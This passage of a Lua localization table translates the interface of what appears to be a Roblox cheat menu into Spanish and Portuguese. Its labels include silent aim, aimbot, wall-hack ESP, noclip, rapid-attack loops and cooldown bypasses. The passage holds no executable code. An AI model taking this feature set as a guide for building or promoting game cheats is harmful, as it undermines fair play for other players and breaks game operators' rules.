        ["Overhead Billboard"] = "Rotulo Superior",
        ["PING"] = "LATENCIA",
        ["PLAYERS"] = "JUGADORES",
        ["Pass through walls and objects"] = "Atraviesa paredes y objetos",
        ["Performance"] = "Rendimiento",
        ["Performance & Network"] = "Rendimiento y Red",
        ["Pink"] = "Rosa",
        ["Player"] = "Jugador",
        ["Player 2D Boxes"] = "Cajas 2D de Jugadores",
        ["Player Bounty Tracker"] = "Bounty del Jugador",
        ["Player Chams & Tracers"] = "Chams y Rastreadores",
        ["Player Chams (Highlight)"] = "Chams de Jugador (Highlight)",
        ["Player Health Status"] = "Salud del Jugador",
        ["Player Level Display"] = "Nivel del Jugador",
        ["Player Names"] = "Nombres de Jugadores",
        ["Player Profile"] = "Perfil del Jugador",
        ["Player Profile & Account"] = "Perfil del Jugador y Cuenta",
        ["Player Radar Elements"] = "Elementos de Radar de Jugador",
        ["Player Silent Aim"] = "Silent Aim en Jugadores",
        ["Player Tracer Color"] = "Color de Linea de Jugador",
        ["Player Tracers"] = "Lineas a Jugadores",
        ["Portuguese"] = "Portugues",
        ["Prediction Amount"] = "Cantidad de Prediccion",
        ["Premium User  •  Active Session"] = "Usuario Premium  •  Sesion Activa",
        ["Preset: Crimson Slayer"] = "Estilo: Asesino Carmesi",
        ["Preset: Cyberpunk Violet"] = "Estilo: Violeta Cyberpunk",
        ["Preset: Emerald Forest"] = "Estilo: Bosque Esmeralda",
        ["Preset: Shorekeeper Cyan"] = "Estilo: Shorekeeper Cian",
        ["Previous (‹)"] = "Anterior (‹)",
        ["Purple"] = "Morado",
        ["PvP"] = "PvP",
        ["PvP Tech, Camlock & Universal Keybinds"] = "Tecnologia PvP, Camlock y Teclas",
        ["Q"] = "Q",
        ["Quick Actions"] = "Acciones Rapidas",
        ["R"] = "R",
        ["RACE"] = "RAZA",
        ["Radar Elements"] = "Elementos de Radar",
        ["Rainbow"] = "Arcoiris",
        ["Rainbow Chroma Speed"] = "Velocidad de Chroma Arcoiris",
        ["Raindrop Density"] = "Densidad de Gotas",
        ["Random (Shuffle)"] = "Aleatorio",
        ["Rapid fire M1 gun shots"] = "Disparos M1 ultra rapidos",
        ["Rapid melee and weapon strikes"] = "Golpes rapidos cuerpo a cuerpo",
        ["Rapid weapon hit bursts"] = "Golpes continuos de arma",
        ["Rapid-fire gun attack loop targeting nearest combatant"] = "Ataque rapido con arma de fuego al objetivo mas cercano",
        ["Red"] = "Rojo",
        ["Redirect skills toward enemy players"] = "Redirige habilidades a jugadores enemigos",
        ["Redirect skills toward mobs and bosses"] = "Redirige habilidades a monstruos y jefes",
        ["Redirects Flashstep teleport directly to enemy player"] = "Redirige el teletransporte directamente al jugador enemigo",
        ["Redirects skills and attacks towards enemy players"] = "Redirige habilidades y ataques hacia jugadores enemigos",
        ["Redirects skills and attacks towards mobs and bosses"] = "Redirige habilidades y ataques hacia monstruos y jefes",
        ["Rejoin Current Server"] = "Reconectar al Servidor",
        ["Remove flashstep cooldown"] = "Elimina el enfriamiento del flashstep",
        ["Removes cooldown delay and bypasses stamina limits"] = "Elimina tiempo de recarga y limites de energia",
        ["Renders hardware 3D Beams and 2D lines to target"] = "Dibuja rayos 3D y lineas 2D al objetivo",
        ["Reset All Settings to Factory Defaults"] = "Restablecer Todo de Fabrica",
        ["Reset Configuration Profile"] = "Restablecer Perfil de Configuracion",
        ["Reset Config"] = "Restablecer Configuracion",
        ["Configuration profile reset to defaults."] = "Perfil de configuracion restablecido a valores por defecto.",
        ["Reset Theme to Purple"] = "Restablecer Tema a Purpura",
        ["Sanguine Boost"] = "Sanguine Boost",
        ["Sanguine Boost Floating Widget"] = "Widget Flotante Sanguine Z",
        ["Sanguine Keybind"] = "Tecla de Sanguine",
        ["Save Configuration Profile"] = "Guardar Perfil de Configuracion",
        ["Save Config"] = "Guardar Configuracion",
        ["Selected Player"] = "Jugador Seleccionado",
        ["Server Hop (Fast)"] = "Cambio de Servidor (Rapido)",
        ["Show FOV Circle"] = "Mostrar Circulo FOV",
        ["Show Tracers"] = "Mostrar Lineas de Rastreo",
        ["Shows distance measurement in studs below player feet"] = "Muestra la distancia en studs bajo los pies",
        ["Shows player rank and numerical level tag"] = "Muestra rango y nivel numerico del jugador",
        ["Shows weapon, sword, fruit or gun held by the player"] = "Muestra arma, espada, fruta o pistola equipada",
        ["Silent Aim"] = "Silent Aim",
        ["Skill Blacklist"] = "Lista Negra de Habilidades",
        ["Skill Delay"] = "Retardo de Habilidad",
        ["Skill Redirection Blacklist"] = "Lista Negra de Habilidades",
        ["Soru"] = "Soru",
        ["Soru Aimbot"] = "Soru Aimbot",
        ["Soru Combat Aimbot"] = "Aimbot Soru",
        ["Soru Flashstep Engine"] = "Motor Soru Flashstep",
        ["Soru Skill Combo"] = "Combo de Habilidades Soru",
        ["Soru Skill Combo Automation"] = "Auto Combo de Habilidades Soru",
        ["Soru Target Mode"] = "Modo de Objetivo Soru",
        ["Spanish"] = "Espanol",
        ["Spawns water surface collider allowing sprint across oceans"] = "Crea plataforma acuatica para correr sobre oceanos",
        ["Speed up player movement"] = "Aumenta la velocidad del jugador",
        ["Standard (100%)"] = "Estandar (100%)",
        ["Subtle (50%)"] = "Sutil (50%)",
        ["Super Jump"] = "Super Salto",
        ["Super Jump Floating Widget"] = "Widget Flotante de Super Salto",
        ["Super Jump Force"] = "Fuerza de Super Salto",
        ["Sword"] = "Espada",
        ["System Info"] = "Informacion del Sistema",
        ["T"] = "T",
        ["Target Hitbox"] = "Zona de Impacto",
        ["Target Player Selection"] = "Seleccion de Jugador Objetivo",
        ["Target Priority"] = "Prioridad de Blanco",
        ["Target Selection & Aim Mode"] = "Seleccion de Objetivo y Modo",
        ["Target Tracers"] = "Rastreadores de Objetivo",
        ["Teleport soru directly to enemy"] = "Teletransporta con soru hacia el enemigo",
        ["Theme Presets"] = "Estilos de Tema",
        ["Theme Reset"] = "Restablecer Tema",
        ["Themes"] = "Temas",
        ["Toggle Rainbow Chroma Mode"] = "Activar Modo Chroma Arcoiris",
        ["Toggle animated falling cyber rain streaks"] = "Activa lluvia animada cyber neon",
        ["Tracer Color"] = "Color de Linea",
        ["Tracer Mode"] = "Modo de Linea",
        ["Tracer Origin"] = "Origen de Linea",
        ["Tracer Thickness"] = "Grosor de Linea",
        ["Tracers"] = "Lineas de Rastreo",
        ["Trigger Super Jump"] = "Activar Super Salto",
        ["Typography Font"] = "Fuente Tipografica",
        ["Typography Studio"] = "Estudio de Tipografia",
        ["UPTIME"] = "TIEMPO ACTIVO",
        ["Ultra fast burst firing with CombatController validator"] = "Disparos en rafaga ultra veloces con validador CombatController",
        ["UpperTorso"] = "Torso Superior",
        ["Use skill instantly after Soru"] = "Lanza habilidad al usar Soru",
        ["V"] = "V",
        ["Vietnamese"] = "Vietnamita",
        ["Visuals"] = "Visuales",
        ["Vitality & Energy Status"] = "Estado de Salud y Energia",
        ["Walk on Water"] = "Caminar sobre el Agua",
        ["Walk on ocean surface"] = "Caminar sobre el mar",
        ["WalkSpeed Value"] = "Valor de Velocidad",
        ["Wallpaper"] = "Fondo de Pantalla",
        ["Wallpapers"] = "Fondos de Pantalla",
        ["White"] = "Blanco",
        ["World & Client Optimization"] = "Optimizacion de Mundo y Cliente",
        ["X"] = "X",
        ["Yellow"] = "Amarillo",
        ["Z"] = "Z",
        ["Z Sanguine Boost"] = "Impulso Sanguine Z",
        ["B1 Hold Time (s)"] = "B1 Tiempo de Retencion (s)",
        ["B1 Mode"] = "B1 Modo",
        ["B1 Post Jumps"] = "B1 Saltos Posteriores",
        ["B1 Skill Key"] = "B1 Tecla",
        ["B1 Weapon"] = "B1 Arma",
        ["B2 Hold Time (s)"] = "B2 Tiempo de Retencion (s)",
        ["B2 Mode"] = "B2 Modo",
        ["B2 Post Jumps"] = "B2 Saltos Posteriores",
        ["B2 Skill Key"] = "B2 Tecla",
        ["B2 Weapon"] = "B2 Arma",
        ["B3 Hold Time (s)"] = "B3 Tiempo de Retencion (s)",
        ["B3 Mode"] = "B3 Modo",
        ["B3 Post Jumps"] = "B3 Saltos Posteriores",
        ["B3 Skill Key"] = "B3 Tecla",
        ["B3 Weapon"] = "B3 Arma",
        ["B4 Hold Time (s)"] = "B4 Tiempo de Retencion (s)",
        ["B4 Mode"] = "B4 Modo",
        ["B4 Post Jumps"] = "B4 Saltos Posteriores",
        ["B4 Skill Key"] = "B4 Tecla",
        ["B4 Weapon"] = "B4 Arma",
        ["B5 Hold Time (s)"] = "B5 Tiempo de Retencion (s)",
        ["B5 Mode"] = "B5 Modo",
        ["B5 Post Jumps"] = "B5 Saltos Posteriores",
        ["B5 Skill Key"] = "B5 Tecla",
        ["B5 Weapon"] = "B5 Arma",
        ["B6 Hold Time (s)"] = "B6 Tiempo de Retencion (s)",
        ["B6 Mode"] = "B6 Modo",
        ["B6 Post Jumps"] = "B6 Saltos Posteriores",
        ["B6 Skill Key"] = "B6 Tecla",
        ["B6 Weapon"] = "B6 Arma",
        ["Block 1 Enabled"] = "Bloque 1 Activado",
        ["Block 2 Enabled"] = "Bloque 2 Activado",
        ["Block 3 Enabled"] = "Bloque 3 Activado",
        ["Block 4 Enabled"] = "Bloque 4 Activado",
        ["Block 5 Enabled"] = "Bloque 5 Activado",
        ["Block 6 Enabled"] = "Bloque 6 Activado",
        ["Combo Sequence (6 Blocks)"] = "Secuencia de Combo (6 Bloques)",
        ["Display real-time FPS and ping overlay top-left"] = "Muestra overlay de FPS y ping en tiempo real",
        ["Displays on-screen one-touch button to trigger combo"] = "Muestra boton en pantalla para activar combo",
        ["Do not target allied players"] = "No apuntar a jugadores aliados",
        ["Do not target players inside safe zones"] = "No apuntar a jugadores dentro de zonas seguras",
        ["Do not target players with PvP disabled"] = "No apuntar a jugadores con PvP desactivado",
        ["Enable step 1 in combo"] = "Activa el paso 1 en el combo",
        ["Enable step 2 in combo"] = "Activa el paso 2 en el combo",
        ["Enable step 3 in combo"] = "Activa el paso 3 en el combo",
        ["Enable step 4 in combo"] = "Activa el paso 4 en el combo",
        ["Enable step 5 in combo"] = "Activa el paso 5 en el combo",
        ["Enable step 6 in combo"] = "Activa el paso 6 en el combo",
        ["Enables keyboard trigger and loop execution"] = "Habilita activacion por teclado y bucle",
        ["Fly"] = "Volar",
        ["Fly Speed"] = "Velocidad de Vuelo",
        ["Glide freely through the air"] = "Planea libremente por el aire",
        ["Ignore Allies"] = "Ignorar Aliados",
        ["Ignore PvP Off"] = "Ignorar PvP Desactivado",
        ["Ignore Safe Zone"] = "Ignorar Zona Segura",
        ["Loop Sequence"] = "Secuencia en Bucle",
        ["Macro"] = "Macro",
        ["Macro Controller"] = "Controlador de Macro",
        ["Macro Enabled"] = "Macro Activado",
        ["Macro Floating Widget"] = "Widget Flotante de Macro",
        ["Macro Slot"] = "Ranura de Macro",
        ["Repeat sequence continuously until stopped"] = "Repite la secuencia continuamente hasta detenerla",
        ["Show FPS & Ping"] = "Mostrar FPS y Ping",
        ["Start Combo Sequence"] = "Iniciar Secuencia de Combo",
        ["Stop Combo Sequence"] = "Detener Secuencia de Combo",
        ["Trigger Key (PC)"] = "Tecla de Activacion (PC)",
    },
    ["Portuguese"] = {
        ["180"] = "180",
        ["2D Boxes"] = "Caixas 2D",
        ["2D Line"] = "Linha 2D",
        ["360"] = "360",
        ["3D Beam"] = "Feixe 3D",
        ["Accent Color & Theme Studio"] = "Estudio de Temas e Cores",
        ["Account & Player Statistics"] = "Estatisticas do Jogador",
        ["Aesthetic Studio Presets"] = "Predefinicoes de Estilo",
        ["Aim Mode"] = "Modo de Mira",
        ["Aimbot"] = "Aimbot",
        ["Allows continuous mid-air jumping without cooldown"] = "Permite pular no ar continuamente sem recarga",
        ["Anti-Lava Damage"] = "Anti-Dano de Lava",
        ["Anti-Lava Immunity"] = "Imunidade a Lava",
        ["Apply Fast FFlags"] = "Aplicar Otimizacao FFlags",
        ["Apply Wallpaper"] = "Aplicar Papel de Parede",
        ["Atmosphere Wallpaper"] = "Papel de Parede Atmosferico",
        ["Atmosphere Wallpaper Presets (24 Styles)"] = "Papeis de Parede Atmosfericos (24 Estilos)",
        ["Auto Buso Haki"] = "Auto Haki de Armamento",
        ["Auto Combat"] = "Combate Automatico",
        ["Auto Race V3"] = "Auto Race V3",
        ["Auto Race V4"] = "Auto Race V4",
        ["Auto Skill Combo"] = "Auto Combo de Habilidades",
        ["Auto Skill on Soru"] = "Habilidade Automatica no Soru",
        ["Automatically activates Buso Armament Haki (No Ken)"] = "Ativa automaticamente Buso Haki de armamento (sem Ken)",
        ["Automatically casts Race V3 ability in combat"] = "Usa automaticamente a habilidade de Raca V3 em combate",
        ["Automatically triggers Race Awakening V4 when gauge is filled"] = "Ativa o despertar de Raca V4 quando a barra enche",
        ["B"] = "B",
        ["BELI"] = "BELI",
        ["BOUNTY"] = "RECOMPENSA",
        ["Background Dimming (%)"] = "Escurecimento do Fundo (%)",
        ["Balanced (65%)"] = "Equilibrado (65%)",
        ["Blue"] = "Azul",
        ["Both"] = "Ambos",
        ["Bottom"] = "Inferior",
        ["Bypasses walkspeed reset with direct physical impulse"] = "Ignora reinicio de velocidade com impulso fisico direto",
        ["C"] = "C",
        ["Calculates lead vector based on enemy velocity and ping"] = "Calcula antecipacao com base na velocidade e ping",
        ["Camera FOV"] = "FOV da Camera",
        ["Camlock"] = "Camlock",
        ["Camlock (Combat Camera)"] = "Camlock (Camera de Combate)",
        ["Camlock Floating Widget"] = "Widget Flutuante Camlock",
        ["Camlock Keybind"] = "Tecla do Camlock",
        ["Caps client to 22 FPS during Sanguine Z cooldown for physics boost"] = "Limita cliente a 22 FPS no cooldown de Sanguine Z para impulso",
        ["Cast Race V3 when in combat"] = "Ativa Race V3 durante o combate",
        ["Cast Race V4 when gauge is full"] = "Ativa Race V4 quando a barra encher",
        ["Center"] = "Centro",
        ["Chams & Tracers"] = "Chams e Linhas",
        ["Chams Highlight Color"] = "Cor do Chams",
        ["Clear / Dark Glass"] = "Limpar / Vidro Escuro",
        ["Combat Passives & Auto Skills"] = "Passivas de Combate e Auto Habilidades",
        ["Combat PvP Status"] = "Status de Combate PvP",
        ["Combat Targeting & Silent Aim"] = "Mira de Combate e Silent Aim",
        ["Combat Tech"] = "Tecnicas de Combate",
        ["Combo Key"] = "Tecla de Combo",
        ["Combo Weapon"] = "Arma de Combo",
        ["Community"] = "Comunidade",
        ["Compact (80%)"] = "Compacto (80%)",
        ["Config"] = "Configuracao",
        ["Configuration Profiles"] = "Perfis de Configuracao",
        ["Configuration Reset"] = "Redefinicao de Configuracao",
        ["Copy Discord Invite Link"] = "Copiar Link do Discord",
        ["Copy Server JobId"] = "Copiar JobId do Servidor",
        ["Credits"] = "Creditos",
        ["Crystal (80%)"] = "Cristal (80%)",
        ["Custom Dash Length"] = "Distancia de Deslize",
        ["Custom WalkSpeed"] = "Velocidade Personalizada",
        ["Custom Wallpaper"] = "Papel de Parede Personalizado",
        ["Custom Wallpaper Studio"] = "Estudio de Papel de Parede Personalizado",
        ["Cyan"] = "Ciano",
        ["Dash Distance"] = "Distancia do Impulso",
        ["Destroys environmental lava kill zones and damage parts"] = "Destroi zonas de dano e partes de lava do ambiente",
        ["Detects safe zone and in-combat status indicators"] = "Detecta zona segura e status de combate",
        ["Developer & Content Creator"] = "Desenvolvedor e Criador",
        ["Development Team & Content Creators"] = "Equipe de Desenvolvimento e Criadores",
        ["Devil Fruit Tracker"] = "Rastreador de Frutas",
        ["Direct Wallpaper"] = "Papel de Parede Direto",
        ["Disable All Visuals"] = "Desativar Todos os Visuais",
        ["Display aim boundary circle"] = "Exibe o circulo limite de mira",
        ["Displays formatted usernames above character heads"] = "Exibe o nome sobre a cabeca do jogador",
        ["Displays live gradient health bars and HP percentage"] = "Exibe barras de vida e porcentagem de HP",
        ["Displays movable on-screen JUMP button for touch"] = "Exibe um botao movel de PULO na tela para toque",
        ["Displays movable on-screen action button for Sanguine Z"] = "Exibe botao de acao flutuante para Sanguine Z",
        ["Displays movable on-screen button to toggle camera lock"] = "Exibe um botao movel na tela para alternar o bloqueio de camera",
        ["Displays movable on-screen toggle for Dragon Gun M1"] = "Exibe um controle movel na tela para Dragon Gun M1",
        ["Displays movable on-screen toggle for camera lock"] = "Exibe botao flutuante para travar camera",
        ["Displays player bounty or honor value in millions"] = "Exibe a recompensa ou valor de honra em milhoes",
        ["Displays targeting circle boundary on screen"] = "Exibe o limite do circulo de mira na tela",
        ["Distance Indicator"] = "Indicador de Distancia",
        ["Dragon Gun M1"] = "Dragon Gun M1",
        ["Dragon Gun M1 Floating Widget"] = "Widget Flutuante Dragon Gun M1",
        ["Draws dynamic bounding boxes around enemy players"] = "Desenha caixas dinamicas ao redor de inimigos",
        ["Draws line from bottom of screen to tracked players"] = "Desenha linha da parte inferior ate os jogadores",
        ["E"] = "E",
        ["ESP Style"] = "Estilo de ESP",
        ["ESP Text Font Size"] = "Tamanho da Fonte ESP",
        ["ESP Visuals"] = "Visuais ESP",
        ["Enable All Visuals"] = "Ativar Todos os Visuais",
        ["Enable Target Prediction"] = "Ativar Predicao de Alvo",
        ["Enable player visual highlights"] = "Ativa o destaque visual dos jogadores",
        ["Enables custom movement speed multiplier"] = "Habilita multiplicador de velocidade personalizada",
        ["Enables high-performance player visual tracking"] = "Habilita rastreamento visual de alta performance",
        ["English"] = "Ingles",
        ["Equipped Tool / Weapon"] = "Arma Equipada",
        ["Equips weapon and casts chosen skill upon Soru animation"] = "Equipa arma e lanca habilidade ao usar Soru",
        ["Esp"] = "Visuais",
        ["Executes rapid melee, sword, and fruit attack bursts"] = "Executa rajadas rapidas para melee, espadas e frutas",
        ["Executes rapid primary attacks on all nearby enemies"] = "Executa ataques primarios rapidos em todos os inimigos proximos",
        ["F"] = "F",
        ["FACTION"] = "FACAO",
        ["FOV"] = "FOV",
        ["FOV Color"] = "Cor do FOV",
        ["FOV Position"] = "Posicao do FOV",
        ["FOV Radius"] = "Raio do FOV",
        ["FOV Thickness"] = "Espessura do FOV",
        ["FPS"] = "FPS",
        ["FRUIT"] = "FRUTA",
        ["Fast Attack"] = "Ataque Rapido",
        ["Fast Attack (Melee, Sword, Fruit)"] = "Ataque Rapido (Melee, Espada, Fruta)",
        ["Fast Flags"] = "Otimizacao Rapida",
        ["FFlags 1 (FPS Booster)"] = "FFlags 1 (Reforco de FPS)",
        ["120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris"] = "Limite de 120 FPS, texturas plasticas, remove nevoeiro e oculta detritos",
        ["No Animations"] = "Sem Animacoes",
        ["Stops non-attack animations to fix sideways bug and character freezes"] = "Para animacoes fora de ataque para corrigir travamentos",
        ["Fast Flags & Engine Tuning"] = "Fast Flags e Otimizacao do Motor",
        ["Field of View"] = "Campo de Visao",
        ["Field of View (FOV Customization)"] = "Campo de Visao (FOV)",
        ["Forward velocity boost"] = "Impulso de velocidade para frente",
        ["French"] = "Frances",
        ["Fruit"] = "Fruta",
        ["Game Stats"] = "Estatisticas de Jogo",
        ["Glass Interface & Visual Effects"] = "Interface de Vidro e Efeitos",
        ["Glass Transparency"] = "Transparencia do Vidro",
        ["Green"] = "Verde",
        ["Gun"] = "Arma de Fogo",
        ["Gun Aura (Dragon Gun M1)"] = "Gun Aura (Dragon Gun M1)",
        ["Head"] = "Cabeca",
        ["High jump leap"] = "Salto de grande altura",
        ["High-distance forward velocity boost with keybind Z"] = "Impulso de velocidade para frente a longa distancia com tecla Z",
        ["Home"] = "Inicio",
        ["HumanoidRootPart"] = "HumanoidRootPart",
        ["Identifies equipped Devil Fruit power (Kitsune, Portal, etc.)"] = "Identifica a fruta equipada (Kitsune, Portal, etc.)",
        ["Illuminates full player character models through walls"] = "Ilumina modelos de jogadores atraves de paredes",
        ["Immunity to lava damage"] = "Imunidade ao dano de lava",
        ["In-Game Attributes"] = "Atributos do Jogo",
        ["Increase dash distance"] = "Aumenta a distancia do deslize",
        ["Infinite Jump"] = "Salto Infinito",
        ["Infinite Soru"] = "Soru Infinito",
        ["Interface Effects"] = "Efeitos Visuais",
        ["Interface Language"] = "Idioma da Interface",
        ["Interface Scale"] = "Escala da Interface",
        ["Jump continuously in mid-air"] = "Pule continuamente no ar",
        ["Keep Armament Haki active"] = "Mantem o Haki de Armamento ativo",
        ["LEVEL"] = "NIVEL",
        ["Language"] = "Idioma",
        ["Language & Localization"] = "Idioma e Localizacao",
        ["Large (120%)"] = "Grande (120%)",
        ["Load Configuration Profile"] = "Carregar Perfil de Configuracao",
        ["Load Config"] = "Carregar Configuracao",
        ["Lock camera onto enemy"] = "Fixa a camera no inimigo",
        ["Locks camera perspective directly onto focused enemy player"] = "Trava a camera diretamente no jogador inimigo focado",
        ["Looking At Me"] = "Olhando Para Mim",
        ["Low HP"] = "Menor Vida",
        ["Master ESP"] = "ESP Principal",
        ["Master ESP Toggle"] = "Interruptor Mestre de ESP",
        ["Master Visuals & Chams"] = "Visuais Mestres e Chams",
        ["Max Range"] = "Alcance Maximo",
        ["Max Soru Range"] = "Alcance Maximo do Soru",
        ["Melee"] = "Corpo a Corpo",
        ["Misc"] = "Diversos",
        ["Mouse"] = "Mouse",
        ["Move smoothly through structures and physical obstacles"] = "Permite mover atraves de estruturas e obstaculos",
        ["Movement"] = "Movimento",
        ["Movement & Agility (PvP Physics)"] = "Movimento e Agilidade (Fisicas PvP)",
        ["Multiplies dash distance for high-speed repositioning"] = "Multiplica distancia de dash para reposicionamento veloz",
        ["Multiplies jump impulse for vertical escape and aerial combat"] = "Multiplica impulso de pulo para fuga vertical e combate",
        ["NPC Silent Aim"] = "Silent Aim em NPCs",
        ["Nearest"] = "Mais Proximo",
        ["Nearest Player"] = "Jogador Mais Proximo",
        ["Neon Rain Layer"] = "Chuva Cyber Neon",
        ["Next (›)"] = "Proximo (›)",
        ["Noclip Wallpass"] = "Noclip Atravessar Paredes",
        ["None"] = "Nenhum",
        ["Official Community & Discord"] = "Comunidade Oficial e Discord",
        ["Orange"] = "Laranja",
        ["Overhead Billboard"] = "Rotulo Superior",
        ["PING"] = "LATENCIA",
        ["PLAYERS"] = "JOGADORES",
        ["Pass through walls and objects"] = "Atravessa paredes e objetos",
        ["Performance"] = "Desempenho",
        ["Performance & Network"] = "Desempenho e Rede",
        ["Pink"] = "Rosa",
        ["Player"] = "Jogador",
        ["Player 2D Boxes"] = "Caixas 2D de Jogadores",
        ["Player Bounty Tracker"] = "Bounty do Jogador",
        ["Player Chams & Tracers"] = "Chams e Rastreadores",
        ["Player Chams (Highlight)"] = "Chams de Jogador (Highlight)",
        ["Player Health Status"] = "Vida dos Jogadores",
        ["Player Level Display"] = "Nivel do Jogador",
        ["Player Names"] = "Nomes dos Jogadores",
        ["Player Profile"] = "Perfil do Jogador",
        ["Player Profile & Account"] = "Perfil do Jogador e Conta",
        ["Player Radar Elements"] = "Elementos do Radar de Jogador",
        ["Player Silent Aim"] = "Silent Aim em Jogadores",
        ["Player Tracer Color"] = "Cor da Linha do Jogador",
        ["Player Tracers"] = "Linhas para Jogadores",
        ["Portuguese"] = "Portugues",
        ["Prediction Amount"] = "Quantidade de Predicao",
        ["Premium User  •  Active Session"] = "Usuario Premium  •  Sessao Ativa",
        ["Preset: Crimson Slayer"] = "Estilo: Assassino Carmesim",
        ["Preset: Cyberpunk Violet"] = "Estilo: Violeta Cyberpunk",
        ["Preset: Emerald Forest"] = "Estilo: Floresta Esmeralda",
        ["Preset: Shorekeeper Cyan"] = "Estilo: Shorekeeper Ciano",
        ["Previous (‹)"] = "Anterior (‹)",
        ["Purple"] = "Roxo",
        ["PvP"] = "PvP",
        ["PvP Tech, Camlock & Universal Keybinds"] = "Tecnologia PvP, Camlock e Teclas",
        ["Q"] = "Q",
        ["Quick Actions"] = "Acoes Rapidas",
        ["R"] = "R",
        ["RACE"] = "RACA",
        ["Radar Elements"] = "Elementos do Radar",
        ["Rainbow"] = "Arco-iris",
        ["Rainbow Chroma Speed"] = "Velocidade do Chroma",
        ["Raindrop Density"] = "Densidade de Gotas",
        ["Random (Shuffle)"] = "Aleatorio",
        ["Rapid fire M1 gun shots"] = "Disparos M1 ultra rapidos",
        ["Rapid melee and weapon strikes"] = "Golpes rapidos corpo a corpo",
        ["Rapid weapon hit bursts"] = "Golpes continuos de arma",
        ["Rapid-fire gun attack loop targeting nearest combatant"] = "Ataque rapido de arma de fogo no alvo mais proximo",
        ["Red"] = "Vermelho",
        ["Redirect skills toward enemy players"] = "Redireciona habilidades para jogadores inimigos",
        ["Redirect skills toward mobs and bosses"] = "Redireciona habilidades para monstros e chefes",
        ["Redirects Flashstep teleport directly to enemy player"] = "Redireciona teletransporte diretamente ao jogador inimigo",
        ["Redirects skills and attacks towards enemy players"] = "Redireciona habilidades e ataques para jogadores inimigos",
        ["Redirects skills and attacks towards mobs and bosses"] = "Redireciona habilidades e ataques para monstros e chefes",
        ["Rejoin Current Server"] = "Reconectar ao Servidor",
        ["Remove flashstep cooldown"] = "Remove o tempo de recarga do flashstep",
        ["Removes cooldown delay and bypasses stamina limits"] = "Remove tempo de recarga e limites de energia",
        ["Renders hardware 3D Beams and 2D lines to target"] = "Renderiza raios 3D e linhas 2D para o alvo",
        ["Reset All Settings to Factory Defaults"] = "Restaurar Padroes de Fabrica",
        ["Reset Configuration Profile"] = "Redefinir Perfil de Configuracao",
        ["Reset Config"] = "Redefinir Configuracao",
        ["Configuration profile reset to defaults."] = "Perfil de configuracao redefinido para os padroes.",
        ["Reset Theme to Purple"] = "Redefinir Tema para Roxo",
        ["Sanguine Boost"] = "Sanguine Boost",
        ["Sanguine Boost Floating Widget"] = "Widget Flutuante Sanguine Z",
        ["Sanguine Keybind"] = "Tecla do Sanguine",
        ["Save Configuration Profile"] = "Salvar Perfil de Configuracao",
        ["Save Config"] = "Salvar Configuracao",
        ["Selected Player"] = "Jogador Selecionado",
        ["Server Hop (Fast)"] = "Trocar Servidor (Rapido)",
        ["Show FOV Circle"] = "Mostrar Circulo FOV",
        ["Show Tracers"] = "Mostrar Linhas de Rastreamento",
        ["Shows distance measurement in studs below player feet"] = "Mostra a distancia em studs sob os pes",
        ["Shows player rank and numerical level tag"] = "Mostra o rank e nivel numerico do jogador",
        ["Shows weapon, sword, fruit or gun held by the player"] = "Mostra arma, espada, fruta ou pistola equipada",
        ["Silent Aim"] = "Silent Aim",
        ["Skill Blacklist"] = "Lista Negra de Habilidades",
        ["Skill Delay"] = "Atraso de Habilidade",
        ["Skill Redirection Blacklist"] = "Lista Negra de Habilidades",
        ["Soru"] = "Soru",
        ["Soru Aimbot"] = "Soru Aimbot",
        ["Soru Combat Aimbot"] = "Aimbot Soru",
        ["Soru Flashstep Engine"] = "Motor Soru Flashstep",
        ["Soru Skill Combo"] = "Combo de Habilidades Soru",
        ["Soru Skill Combo Automation"] = "Auto Combo de Habilidades Soru",
        ["Soru Target Mode"] = "Modo de Alvo do Soru",
        ["Spanish"] = "Espanhol",
        ["Spawns water surface collider allowing sprint across oceans"] = "Cria plataforma aquatica para correr sobre os oceanos",
        ["Speed up player movement"] = "Aumenta a velocidade do jogador",
        ["Standard (100%)"] = "Padrao (100%)",
        ["Subtle (50%)"] = "Sutil (50%)",
        ["Super Jump"] = "Super Salto",
        ["Super Jump Floating Widget"] = "Widget Flutuante de Super Pulo",
        ["Super Jump Force"] = "Forca do Super Salto",
        ["Sword"] = "Espada",
        ["System Info"] = "Informacoes do Sistema",
        ["T"] = "T",
        ["Target Hitbox"] = "Regiao de Impacto",
        ["Target Player Selection"] = "Selecao de Jogador Alvo",
        ["Target Priority"] = "Prioridade de Alvo",
        ["Target Selection & Aim Mode"] = "Selecao de Alvo e Modo",
        ["Target Tracers"] = "Linhas Rastreadoras de Alvo",
        ["Teleport soru directly to enemy"] = "Teletransporta com soru para o inimigo",
        ["Theme Presets"] = "Predefinicoes de Tema",
        ["Theme Reset"] = "Redefinir Tema",
        ["Themes"] = "Temas",
        ["Toggle Rainbow Chroma Mode"] = "Ativar Modo Chroma Arco-iris",
        ["Toggle animated falling cyber rain streaks"] = "Ativa chuva animada cyber neon",
        ["Tracer Color"] = "Cor da Linha",
        ["Tracer Mode"] = "Modo de Linha",
        ["Tracer Origin"] = "Origem da Linha",
        ["Tracer Thickness"] = "Espessura da Linha",
        ["Tracers"] = "Linhas de Rastreamento",
        ["Trigger Super Jump"] = "Ativar Super Pulo",
        ["Typography Font"] = "Fonte Tipografica",
        ["Typography Studio"] = "Estudio de Tipografia",
        ["UPTIME"] = "TEMPO ATIVO",
        ["Ultra fast burst firing with CombatController validator"] = "Disparos ultra rapidos em rajada com validador CombatController",
        ["UpperTorso"] = "Torso Superior",
        ["Use skill instantly after Soru"] = "Lanca habilidade logo apos o Soru",
        ["V"] = "V",
        ["Vietnamese"] = "Vietnamita",
        ["Visuals"] = "Visuais",
        ["Vitality & Energy Status"] = "Estado de Saude e Energia",
        ["Walk on Water"] = "Andar sobre a Agua",
        ["Walk on ocean surface"] = "Andar sobre o oceano",
        ["WalkSpeed Value"] = "Valor de Velocidade",
        ["Wallpaper"] = "Papel de Parede",
        ["Wallpapers"] = "Papeis de Parede",
        ["White"] = "Branco",
        ["World & Client Optimization"] = "Otimizacao de Mundo e Cliente",
        ["X"] = "X",
        ["Yellow"] = "Amarelo",
        ["Z"] = "Z",
        ["Z Sanguine Boost"] = "Impulso Sanguine Z",
        ["B1 Hold Time (s)"] = "B1 Tempo de Retencao (s)",
        ["B1 Mode"] = "B1 Modo",
        ["B1 Post Jumps"] = "B1 Pulos Posteriores",
        ["B1 Skill Key"] = "B1 Tecla",
        ["B1 Weapon"] = "B1 Arma",
        ["B2 Hold Time (s)"] = "B2 Tempo de Retencao (s)",
        ["B2 Mode"] = "B2 Modo",
        ["B2 Post Jumps"] = "B2 Pulos Posteriores",
